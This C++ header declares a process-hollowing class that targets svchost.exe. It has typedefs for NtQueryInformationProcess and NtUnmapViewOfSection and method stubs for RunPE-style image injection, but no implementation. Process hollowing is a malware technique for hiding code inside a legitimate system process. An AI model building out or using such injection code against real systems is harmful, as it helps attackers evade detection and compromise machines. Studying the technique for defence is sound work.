#pragma once

//#define SOURCE_APP_NAME	L"HelloWorld.exe"
#define SOURCE_APP_NAME	L"RunningProcessList.exe"
#define TARGET_APP_NAME	L"svchost.exe"

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessWow64Information = 26
} PROCESSINFOCLASS;

typedef LONG
(NTAPI* PFN_NTQUERYINFORMATIONPROCESS)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

typedef NTSTATUS
(WINAPI* PFN_NTUNMAPVIEWOFSECTION)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

class ProcessHollowing {

public:

	ProcessHollowing(std::wstring sourceProcessPath, std::wstring sourceModulePath, std::wstring destProcessPath)
	{
		m_sourceProcessPath = sourceProcessPath;
		m_sourceModulePath = sourceModulePath;
		m_destProcessPath = destProcessPath;
		m_pProcessInfo = nullptr;
		m_pfnQueryInformationProcess = nullptr;
		m_boShowWindow = true;
		m_pbyBuffer = nullptr;
		m_sourceFileSize = 0;
		m_pfnNtUnmapViewOfSection = nullptr;
		m_boTarget32BitProcess = FALSE;
		m_boSource32BitProcess = false;
		m_boRelocation = false;
	}

	bool Init();
	bool Deinit();

	bool CreateHollowedProcess();
	bool WaitForTargetProcess();
	bool CleanProcess(bool boTerminate);
private:

	bool ExecFile();
	bool GetProcessBaseAddress();
	bool ReadSourceFile();
	bool RunPE();
	bool RunPE32();
	bool RunPE64();
	bool RunPEReloc32();
	bool RunPEReloc64();

private:

	DWORD m_dwError;
	bool m_boShowWindow;
	ULONG_PTR m_baseAddress;
	DWORD m_sourceFileSize;
	PBYTE m_pbyBuffer;
	bool m_boRelocation;
	BOOL m_boTarget32BitProcess;
	bool m_boSource32BitProcess;
	std::wstring m_destProcessPath;
	std::wstring m_sourceProcessPath;
	std::wstring m_sourceModulePath;
	LPPROCESS_INFORMATION m_pProcessInfo;
	PFN_NTQUERYINFORMATIONPROCESS m_pfnQueryInformationProcess;
	PFN_NTUNMAPVIEWOFSECTION m_pfnNtUnmapViewOfSection;
};
